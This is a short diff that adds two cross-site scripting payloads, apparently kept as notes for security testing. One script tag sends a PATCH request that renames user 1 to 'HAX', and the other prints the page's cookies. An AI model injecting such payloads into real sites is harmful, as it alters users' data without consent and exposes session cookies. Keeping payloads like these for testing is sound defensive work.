@@ -1,0 +1,5 @@
+XSS:
+  <script>$.ajax("/users/1", { method: "patch", data: { user: {first_name: "HAX" }}});</script>
+
+Cookie:
+  <script>console.log(document.cookie)</script>
